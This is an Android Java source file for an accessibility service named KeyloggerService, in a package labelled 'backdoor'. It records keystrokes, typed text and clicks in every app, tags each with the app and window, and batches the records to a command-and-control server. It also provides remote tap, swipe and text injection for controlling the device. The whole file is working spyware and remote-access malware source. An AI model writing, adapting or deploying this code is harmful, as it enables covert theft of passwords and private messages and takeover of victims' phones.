package com.lazyframework.backdoor;

import static androidx.core.view.KeyEventDispatcher.dispatchKeyEvent;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.KeyEvent;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;


import androidx.annotation.RequiresApi;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Queue;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;

public class KeyloggerService extends AccessibilityService {

    private static final String TAG = "KeyloggerService";
    private static final String CHANNEL_ID = "keylogger_channel";
    private static final int NOTIFICATION_ID = 1001;
    private static final int BATCH_SIZE = 50;
    private static final long BATCH_TIMEOUT = 30000;

    private Queue<KeystrokeEvent> keystrokeQueue;
    private Queue<KeystrokeEvent> historyBuffer;
    private Handler handler;
    private Runnable batchSendRunnable;

    private AtomicBoolean isLogging = new AtomicBoolean(false);
    private AtomicBoolean isServiceRunning = new AtomicBoolean(false);
    private long lastBatchSentTime = 0;
    private int totalKeystrokesLogged = 0;

    private String currentApp = "";
    private String currentWindow = "";

    private boolean isForegroundStarted = false;

    // ✅ HISTORY BUFFER
    private static final int MAX_HISTORY_SIZE = 1000;
    private static final int MAX_HISTORY_TO_DUMP = 500;

    // ==================== LIFECYCLE ====================

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🔐 KeyloggerService onCreate");

        if (keystrokeQueue == null) {
            keystrokeQueue = new ConcurrentLinkedQueue<>();
        }
        if (historyBuffer == null) {
            historyBuffer = new ConcurrentLinkedQueue<>();
        }

        handler = new Handler(Looper.getMainLooper());
        startForegroundService();
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "✅ KeyloggerService connected");

        ServiceController.setKeyloggerService(this);
        Log.d(TAG, "✅ KeyloggerService registered to ServiceController");

        if (keystrokeQueue == null) {
            keystrokeQueue = new ConcurrentLinkedQueue<>();
        }
        if (historyBuffer == null) {
            historyBuffer = new ConcurrentLinkedQueue<>();
        }

        isLogging.set(true);
        isServiceRunning.set(true);

        configureAccessibilityService();
        startBatchSendScheduler();

        sendStatusToAgentServiceWithRetry();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "⏹️ KeyloggerService destroyed");

        ServiceController.clearKeyloggerService();
        Log.d(TAG, "✅ KeyloggerService unregistered from ServiceController");

        isLogging.set(false);
        isServiceRunning.set(false);

        if (keystrokeQueue != null && !keystrokeQueue.isEmpty()) {
            Log.d(TAG, "📤 Sending remaining " + keystrokeQueue.size() + " keystrokes");
            sendBatchKeystrokes();
        }

        if (handler != null && batchSendRunnable != null) {
            handler.removeCallbacks(batchSendRunnable);
        }

        keystrokeQueue = null;
        historyBuffer = null;
        handler = null;
    }

    // ==================== FOREGROUND SERVICE ====================

    private void startForegroundService() {
        try {
            createNotificationChannel();
            Notification notification = createNotification("Keylogger is running...");
            startForeground(NOTIFICATION_ID, notification);
            isForegroundStarted = true;
            Log.d(TAG, "✅ Foreground service started");
        } catch (Exception e) {
            Log.e(TAG, "❌ Failed to start foreground: " + e.getMessage());
            try {
                Notification notification = createNotification("Keylogger running");
                startForeground(NOTIFICATION_ID, notification);
                isForegroundStarted = true;
            } catch (Exception e2) {
                Log.e(TAG, "❌ Fallback foreground failed: " + e2.getMessage());
            }
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel channel = new NotificationChannel(
                        CHANNEL_ID,
                        "Keylogger Service",
                        NotificationManager.IMPORTANCE_LOW
                );
                channel.setDescription("Keylogger Accessibility Service");
                channel.setSound(null, null);

                NotificationManager manager = getSystemService(NotificationManager.class);
                if (manager != null) {
                    manager.createNotificationChannel(channel);
                }
            } catch (Exception e) {
                Log.e(TAG, "Channel error: " + e.getMessage());
            }
        }
    }

    private Notification createNotification(String text) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("🔐 Keylogger")
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.ic_menu_edit)
                    .setPriority(Notification.PRIORITY_LOW)
                    .setOngoing(true)
                    .build();
        } else {
            return new Notification.Builder(this)
                    .setContentTitle("🔐 Keylogger")
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.ic_menu_edit)
                    .setPriority(Notification.PRIORITY_LOW)
                    .setOngoing(true)
                    .build();
        }
    }

    // ==================== SEND STATUS ====================

    private void sendKeyloggerStatus(AgentService agentService) {
        try {
            JSONObject status = new JSONObject();
            status.put("type", "keylogger_status");
            status.put("agent_id", getAgentId());
            status.put("is_logging", isLogging.get());
            status.put("service_connected", true);
            status.put("timestamp", System.currentTimeMillis());

            agentService.sendRawData(status.toString());
            Log.d(TAG, "📤 Keylogger status sent to AgentService");
        } catch (Exception e) {
            Log.e(TAG, "Error sending keylogger status: " + e.getMessage());
        }
    }

    private void sendStatusToAgentServiceWithRetry() {
        AgentService agent = ServiceController.getAgentService();

        if (agent != null) {
            sendKeyloggerStatus(agent);
            Log.d(TAG, "📤 Keylogger status sent to AgentService");
            return;
        }

        Log.w(TAG, "⚠️ AgentService not available yet, waiting...");

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                AgentService retry = ServiceController.getAgentService();
                if (retry != null) {
                    sendKeyloggerStatus(retry);
                    Log.d(TAG, "📤 Keylogger status sent (retry)");
                } else {
                    Log.w(TAG, "⚠️ AgentService still not available after retry");
                    handler.postDelayed(this, 3000);
                }
            }
        }, 2000);
    }

    // ==================== ACCESSIBILITY EVENT HANDLING ====================

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!isLogging.get() || keystrokeQueue == null) {
            return;
        }

        try {
            int eventType = event.getEventType();

            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                if (event.getSource() != null) {
                    currentWindow = event.getSource().getClassName() != null ? 
                            event.getSource().getClassName().toString() : "Unknown";
                }
                currentApp = event.getPackageName() != null ?
                        event.getPackageName().toString() : "Unknown";

                Log.d(TAG, "📱 Window changed: " + currentApp + " / " + currentWindow);
            }

            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                handleTextChange(event);
            }

            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                handleViewClicked(event);
            }

        } catch (Exception e) {
            Log.e(TAG, "❌ Error handling accessibility event: " + e.getMessage());
        }
    }

    @Override
    public boolean onKeyEvent(KeyEvent event) {
        if (!isLogging.get() || keystrokeQueue == null) {
            return false;
        }

        try {
            if (event.getAction() == KeyEvent.ACTION_DOWN) {
                handleKeyDown(event);
            }
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Error handling key event: " + e.getMessage());
            return false;
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "⚠️ KeyloggerService interrupted");
    }

    // ==================== KEYSTROKE CAPTURE ====================

    private void handleKeyDown(KeyEvent event) {
        if (keystrokeQueue == null) return;

        try {
            int keyCode = event.getKeyCode();
            String keyName = getKeyName(keyCode);

            if (keyName == null) {
                return;
            }

            if (isSystemKey(keyCode) && !isImportantSystemKey(keyCode)) {
                return;
            }

            String timestamp = getCurrentTimestamp();

            KeystrokeEvent keystroke = new KeystrokeEvent(
                    keyName,
                    timestamp,
                    currentApp,
                    currentWindow,
                    event.getRepeatCount() > 0
            );

            keystrokeQueue.offer(keystroke);

            if (historyBuffer != null) {
                historyBuffer.offer(keystroke);
                if (historyBuffer.size() > MAX_HISTORY_SIZE) {
                    historyBuffer.poll();
                }
                Log.d(TAG, "📝 History size: " + historyBuffer.size());
            }

            totalKeystrokesLogged++;
            Log.d(TAG, "📊 Total: " + totalKeystrokesLogged + ", Key: " + keyName);

            if (keystrokeQueue.size() >= BATCH_SIZE) {
                Log.d(TAG, "📤 Batch threshold reached (" + BATCH_SIZE + "), sending immediately");
                sendBatchKeystrokes();
            }

        } catch (Exception e) {
            Log.e(TAG, "Error capturing keystroke: " + e.getMessage());
        }
    }

    private void handleTextChange(AccessibilityEvent event) {
        if (keystrokeQueue == null) return;

        try {
            CharSequence text = null;

            if (event.getBeforeText() != null && event.getText() != null && !event.getText().isEmpty()) {
                String before = event.getBeforeText().toString();
                String after = event.getText().get(0).toString();

                if (after.length() > before.length()) {
                    text = after.subSequence(before.length(), after.length());
                }
            }

            if (text != null && text.length() > 0) {
                String textStr = text.toString();
                String timestamp = getCurrentTimestamp();

                for (char c : textStr.toCharArray()) {
                    KeystrokeEvent keystroke = new KeystrokeEvent(
                            String.valueOf(c),
                            timestamp,
                            currentApp,
                            currentWindow,
                            false
                    );

                    keystrokeQueue.offer(keystroke);

                    if (historyBuffer != null) {
                        historyBuffer.offer(keystroke);
                        if (historyBuffer.size() > MAX_HISTORY_SIZE) {
                            historyBuffer.poll();
                        }
                    }

                    totalKeystrokesLogged++;
                }

                Log.d(TAG, "📝 Captured text change: " + textStr.length() +
                        " characters from " + currentApp);
            }

        } catch (Exception e) {
            Log.e(TAG, "Error handling text change: " + e.getMessage());
        }
    }

    private void handleViewClicked(AccessibilityEvent event) {
        if (keystrokeQueue == null) return;

        try {
            if (event.getSource() != null) {
                CharSequence contentDesc = event.getSource().getContentDescription();
                CharSequence text = event.getSource().getText();

                String clickInfo = text != null ? text.toString() :
                        (contentDesc != null ? contentDesc.toString() : "Button");

                KeystrokeEvent keystroke = new KeystrokeEvent(
                        "[CLICK:" + clickInfo + "]",
                        getCurrentTimestamp(),
                        currentApp,
                        currentWindow,
                        false
                );

                keystrokeQueue.offer(keystroke);

                if (historyBuffer != null) {
                    historyBuffer.offer(keystroke);
                    if (historyBuffer.size() > MAX_HISTORY_SIZE) {
                        historyBuffer.poll();
                    }
                }

                totalKeystrokesLogged++;

                Log.d(TAG, "🖱️ Captured click: " + clickInfo);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling view click: " + e.getMessage());
        }
    }

    // ==================== BATCH SEND ====================

    private void startBatchSendScheduler() {
        batchSendRunnable = new Runnable() {
            @Override
            public void run() {
                try {
                    if (keystrokeQueue == null) {
                        handler.postDelayed(this, 5000);
                        return;
                    }

                    long now = System.currentTimeMillis();

                    if ((now - lastBatchSentTime >= BATCH_TIMEOUT) &&
                            !keystrokeQueue.isEmpty()) {
                        Log.d(TAG, "⏱️ Batch timeout reached, sending keystrokes");
                        sendBatchKeystrokes();
                    }

                    handler.postDelayed(this, 5000);

                } catch (Exception e) {
                    Log.e(TAG, "Error in batch scheduler: " + e.getMessage());
                    if (handler != null) {
                        handler.postDelayed(this, 5000);
                    }
                }
            }
        };

        if (handler != null) {
            handler.postDelayed(batchSendRunnable, BATCH_TIMEOUT);
        }
    }

    private void sendBatchKeystrokes() {
        if (keystrokeQueue == null || keystrokeQueue.isEmpty()) {
            return;
        }

        try {
            JSONArray keystrokes = new JSONArray();
            int count = 0;

            while (!keystrokeQueue.isEmpty() && count < BATCH_SIZE) {
                KeystrokeEvent event = keystrokeQueue.poll();
                if (event != null) {
                    keystrokes.put(event.toJSON());
                    count++;
                }
            }

            if (count == 0) {
                return;
            }

            Log.d(TAG, "📤 Sending keylog batch: " + count + " keystrokes");

            AgentService agentService = ServiceController.getAgentService();
            if (agentService != null && agentService.isC2Connected()) {
                JSONObject json = new JSONObject();
                json.put("type", "response");
                json.put("agent_id", getAgentId());
                json.put("command", "KEYLOG_BATCH");
                json.put("timestamp", System.currentTimeMillis());

                JSONObject result = new JSONObject();
                result.put("type", "keylog_batch");
                result.put("count", count);
                result.put("keystrokes", keystrokes);
                result.put("batch_timestamp", getCurrentTimestamp());

                json.put("result", result);

                agentService.sendRawData(json.toString());
                lastBatchSentTime = System.currentTimeMillis();
                Log.d(TAG, "📤 Keylog batch sent to C2 via AgentService (" + count + " keystrokes)");

            } else {
                JSONObject json = new JSONObject();
                json.put("type", "response");
                json.put("agent_id", getAgentId());
                json.put("command", "KEYLOG_BATCH");
                json.put("timestamp", System.currentTimeMillis());

                JSONObject result = new JSONObject();
                result.put("type", "keylog_batch");
                result.put("count", count);
                result.put("keystrokes", keystrokes);
                result.put("batch_timestamp", getCurrentTimestamp());

                json.put("result", result);

                Intent intent = new Intent("com.lazyframework.KEYLOG_BATCH");
                intent.putExtra("data", json.toString());
                intent.setPackage(getPackageName());
                sendBroadcast(intent);

                lastBatchSentTime = System.currentTimeMillis();
                Log.d(TAG, "📤 Keylog batch broadcast sent (" + count + " keystrokes)");
            }

        } catch (Exception e) {
            Log.e(TAG, "❌ Error sending batch: " + e.getMessage());
        }
    }

    // ==================== CONFIGURATION ====================

    private void configureAccessibilityService() {
        try {
            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
            info.flags = AccessibilityServiceInfo.DEFAULT |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                    AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS |
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                info.flags |= AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY;
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                info.flags |= AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
            }

            info.notificationTimeout = 100;
            info.packageNames = null; // monitor semua app

            setServiceInfo(info);

            Log.d(TAG, "✅ Accessibility service configured");

        } catch (Exception e) {
            Log.e(TAG, "Error configuring service: " + e.getMessage());
        }
    }

    // ==================== UTILITY METHODS ====================

    private String getKeyName(int keyCode) {
        switch (keyCode) {
            case KeyEvent.KEYCODE_0: return "0";
            case KeyEvent.KEYCODE_1: return "1";
            case KeyEvent.KEYCODE_2: return "2";
            case KeyEvent.KEYCODE_3: return "3";
            case KeyEvent.KEYCODE_4: return "4";
            case KeyEvent.KEYCODE_5: return "5";
            case KeyEvent.KEYCODE_6: return "6";
            case KeyEvent.KEYCODE_7: return "7";
            case KeyEvent.KEYCODE_8: return "8";
            case KeyEvent.KEYCODE_9: return "9";
            case KeyEvent.KEYCODE_A: return "A";
            case KeyEvent.KEYCODE_B: return "B";
            case KeyEvent.KEYCODE_C: return "C";
            case KeyEvent.KEYCODE_D: return "D";
            case KeyEvent.KEYCODE_E: return "E";
            case KeyEvent.KEYCODE_F: return "F";
            case KeyEvent.KEYCODE_G: return "G";
            case KeyEvent.KEYCODE_H: return "H";
            case KeyEvent.KEYCODE_I: return "I";
            case KeyEvent.KEYCODE_J: return "J";
            case KeyEvent.KEYCODE_K: return "K";
            case KeyEvent.KEYCODE_L: return "L";
            case KeyEvent.KEYCODE_M: return "M";
            case KeyEvent.KEYCODE_N: return "N";
            case KeyEvent.KEYCODE_O: return "O";
            case KeyEvent.KEYCODE_P: return "P";
            case KeyEvent.KEYCODE_Q: return "Q";
            case KeyEvent.KEYCODE_R: return "R";
            case KeyEvent.KEYCODE_S: return "S";
            case KeyEvent.KEYCODE_T: return "T";
            case KeyEvent.KEYCODE_U: return "U";
            case KeyEvent.KEYCODE_V: return "V";
            case KeyEvent.KEYCODE_W: return "W";
            case KeyEvent.KEYCODE_X: return "X";
            case KeyEvent.KEYCODE_Y: return "Y";
            case KeyEvent.KEYCODE_Z: return "Z";
            case KeyEvent.KEYCODE_SPACE: return " ";
            case KeyEvent.KEYCODE_ENTER: return "[ENTER]";
            case KeyEvent.KEYCODE_DEL: return "[BACKSPACE]";
            case KeyEvent.KEYCODE_TAB: return "[TAB]";
            case KeyEvent.KEYCODE_PERIOD: return ".";
            case KeyEvent.KEYCODE_COMMA: return ",";
            case KeyEvent.KEYCODE_AT: return "@";
            case KeyEvent.KEYCODE_APOSTROPHE: return "'";
            case KeyEvent.KEYCODE_SLASH: return "/";
            case KeyEvent.KEYCODE_STAR: return "*";
            case KeyEvent.KEYCODE_MINUS: return "-";
            case KeyEvent.KEYCODE_PLUS: return "+";
            case KeyEvent.KEYCODE_EQUALS: return "=";
            case KeyEvent.KEYCODE_SEMICOLON: return ";";
            case KeyEvent.KEYCODE_GRAVE: return "`";
            case KeyEvent.KEYCODE_LEFT_BRACKET: return "[";
            case KeyEvent.KEYCODE_RIGHT_BRACKET: return "]";
            case KeyEvent.KEYCODE_BACKSLASH: return "\\";
            case KeyEvent.KEYCODE_VOLUME_UP: return "[VOL_UP]";
            case KeyEvent.KEYCODE_VOLUME_DOWN: return "[VOL_DOWN]";
            case KeyEvent.KEYCODE_POWER: return "[POWER]";
            default: return null;
        }
    }

    private boolean isSystemKey(int keyCode) {
        return keyCode >= KeyEvent.KEYCODE_SOFT_LEFT &&
                keyCode <= KeyEvent.KEYCODE_BUTTON_MODE;
    }

    private boolean isImportantSystemKey(int keyCode) {
        return keyCode == KeyEvent.KEYCODE_HOME ||
                keyCode == KeyEvent.KEYCODE_BACK ||
                keyCode == KeyEvent.KEYCODE_POWER;
    }

    private String getCurrentTimestamp() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.US);
        return sdf.format(new Date());
    }

    private String getAgentId() {
        return Settings.Secure.getString(
                getContentResolver(),
                Settings.Secure.ANDROID_ID
        );
    }

    // ==================== CONTROL METHODS ====================

    public void startLogging() {
        if (keystrokeQueue == null) {
            keystrokeQueue = new ConcurrentLinkedQueue<>();
        }
        if (historyBuffer == null) {
            historyBuffer = new ConcurrentLinkedQueue<>();
        }
        isLogging.set(true);
        Log.d(TAG, "▶️ Keylogging started");
    }

    public void stopLogging() {
        isLogging.set(false);
        Log.d(TAG, "⏸️ Keylogging paused");
    }

    public boolean isLogging() {
        return isLogging.get();
    }

    public int getTotalKeystrokesLogged() {
        return totalKeystrokesLogged;
    }

    public int getQueueSize() {
        return keystrokeQueue != null ? keystrokeQueue.size() : 0;
    }

    public int getHistorySize() {
        return historyBuffer != null ? historyBuffer.size() : 0;
    }

    public String getLogs() {
        StringBuilder sb = new StringBuilder();

        sb.append("=== KEYLOGS DUMP ===\n");
        sb.append("Total keystrokes logged: ").append(totalKeystrokesLogged).append("\n");
        sb.append("History size: ").append(historyBuffer != null ? historyBuffer.size() : 0).append("\n");
        sb.append("Queue size: ").append(keystrokeQueue != null ? keystrokeQueue.size() : 0).append("\n");
        sb.append("Logging enabled: ").append(isLogging.get()).append("\n\n");

        if (historyBuffer != null && !historyBuffer.isEmpty()) {
            sb.append("=== HISTORY BUFFER (last ").append(Math.min(historyBuffer.size(), MAX_HISTORY_TO_DUMP)).append(") ===\n\n");

            Queue<KeystrokeEvent> copy = new ConcurrentLinkedQueue<>(historyBuffer);
            int max = Math.min(copy.size(), MAX_HISTORY_TO_DUMP);

            int skip = Math.max(0, copy.size() - max);
            for (int i = 0; i < skip && !copy.isEmpty(); i++) {
                copy.poll();
            }

            int count = 0;
            for (KeystrokeEvent event : copy) {
                sb.append("[").append(event.timestamp).append("] ")
                        .append(event.app).append(": ")
                        .append(event.key);
                if (event.isRepeat) sb.append(" (repeat)");
                sb.append("\n");
                count++;
                if (count >= max) break;
            }

            if (count > 0) {
                sb.append("\n--- Showing ").append(count).append(" of ").append(historyBuffer.size()).append(" keystrokes ---\n");
            }

        } else {
            sb.append("No keystrokes in history.\n");

            if (keystrokeQueue != null && !keystrokeQueue.isEmpty()) {
                sb.append("\n=== QUEUE BUFFER (").append(keystrokeQueue.size()).append(" pending) ===\n");
                Queue<KeystrokeEvent> queueCopy = new ConcurrentLinkedQueue<>(keystrokeQueue);
                int qCount = 0;
                for (KeystrokeEvent event : queueCopy) {
                    sb.append("[").append(event.timestamp).append("] ")
                            .append(event.app).append(": ")
                            .append(event.key);
                    if (event.isRepeat) sb.append(" (repeat)");
                    sb.append("\n");
                    qCount++;
                    if (qCount >= 50) {
                        int remaining = keystrokeQueue.size() - qCount;
                        if (remaining > 0) {
                            sb.append("... and ").append(remaining).append(" more in queue\n");
                        }
                        break;
                    }
                }
            }
        }

        return sb.toString();
    }

    public void clearHistory() {
        if (historyBuffer != null) {
            historyBuffer.clear();
            Log.d(TAG, "🗑️ History buffer cleared");
        }
    }

    // ==================== RDP CONTROL METHODS (VNC LIKE) ====================

    @RequiresApi(api = Build.VERSION_CODES.N)
    public void performClick(int x, int y) {
        try {
            Path clickPath = new Path();
            clickPath.moveTo(x, y);

            GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
            gestureBuilder.addStroke(new GestureDescription.StrokeDescription(clickPath, 0, 50));

            dispatchGesture(gestureBuilder.build(), null, null);
            Log.d(TAG, "🖱️ Click at: " + x + ", " + y);

        } catch (Exception e) {
            Log.e(TAG, "Click error: " + e.getMessage());
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    public void performSwipe(int x1, int y1, int x2, int y2, int duration) {
        try {
            Path swipePath = new Path();
            swipePath.moveTo(x1, y1);
            swipePath.lineTo(x2, y2);

            GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
            gestureBuilder.addStroke(new GestureDescription.StrokeDescription(swipePath, 0, duration));

            dispatchGesture(gestureBuilder.build(), null, null);
            Log.d(TAG, "🖱️ Swipe: " + x1 + "," + y1 + " -> " + x2 + "," + y2);

        } catch (Exception e) {
            Log.e(TAG, "Swipe error: " + e.getMessage());
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    public void performScroll(int delta) {
        try {
            int centerX = getScreenWidth() / 2;
            int centerY = getScreenHeight() / 2;
            int scrollDistance = Math.abs(delta) * 20;

            if (delta > 0) {
                performSwipe(centerX, centerY + scrollDistance, centerX, centerY - scrollDistance, 200);
            } else {
                performSwipe(centerX, centerY - scrollDistance, centerX, centerY + scrollDistance, 200);
            }

        } catch (Exception e) {
            Log.e(TAG, "Scroll error: " + e.getMessage());
        }
    }

    public void performKeyPress(int keyCode) {
        try {
            KeyEvent event = new KeyEvent(KeyEvent.ACTION_DOWN, keyCode);
            dispatchKeyEvent(event);

            KeyEvent eventUp = new KeyEvent(KeyEvent.ACTION_UP, keyCode);
            dispatchKeyEvent(eventUp);

            Log.d(TAG, "⌨️ Key press: " + keyCode);

        } catch (Exception e) {
            Log.e(TAG, "Key press error: " + e.getMessage());
        }
    }

    private void dispatchKeyEvent(KeyEvent event) {
    }

    public void performTextInput(String text) {
        try {
            Bundle arguments = new Bundle();
            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);

            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                if (focused != null) {
                    focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                    focused.recycle();
                }
                root.recycle();
            }

            Log.d(TAG, "⌨️ Text input: " + text);

        } catch (Exception e) {
            Log.e(TAG, "Text input error: " + e.getMessage());
        }
    }

    public void performBack() {
        try {
            performKeyPress(KeyEvent.KEYCODE_BACK);
        } catch (Exception e) {
            Log.e(TAG, "Back error: " + e.getMessage());
        }
    }

    public void performHome() {
        try {
            performKeyPress(KeyEvent.KEYCODE_HOME);
        } catch (Exception e) {
            Log.e(TAG, "Home error: " + e.getMessage());
        }
    }

    public void performRecent() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                performKeyPress(KeyEvent.KEYCODE_APP_SWITCH);
            }
        } catch (Exception e) {
            Log.e(TAG, "Recent error: " + e.getMessage());
        }
    }

    public void performTouch(int x, int y) {
        performClick(x, y);
    }

    // ==================== SCREEN DIMENSIONS HELPER ====================

    private int getScreenWidth() {
        try {
            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            if (wm != null) {
                DisplayMetrics metrics = new DisplayMetrics();
                wm.getDefaultDisplay().getMetrics(metrics);
                return metrics.widthPixels;
            }
        } catch (Exception e) {
            Log.e(TAG, "Get screen width error: " + e.getMessage());
        }
        return 1080; // fallback
    }

    private int getScreenHeight() {
        try {
            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            if (wm != null) {
                DisplayMetrics metrics = new DisplayMetrics();
                wm.getDefaultDisplay().getMetrics(metrics);
                return metrics.heightPixels;
            }
        } catch (Exception e) {
            Log.e(TAG, "Get screen height error: " + e.getMessage());
        }
        return 1920; // fallback
    }

    // ==================== INNER CLASS: KEYSTROKE EVENT ====================

    public static class KeystrokeEvent {
        public String key;
        public String timestamp;
        public String app;
        public String window;
        public boolean isRepeat;

        public KeystrokeEvent(String key, String timestamp,
                              String app, String window, boolean isRepeat) {
            this.key = key;
            this.timestamp = timestamp;
            this.app = app;
            this.window = window;
            this.isRepeat = isRepeat;
        }

        public JSONObject toJSON() throws Exception {
            JSONObject json = new JSONObject();
            json.put("key", key);
            json.put("timestamp", timestamp);
            json.put("app", app);
            json.put("window", window);
            json.put("is_repeat", isRepeat);
            return json;
        }
    }
}
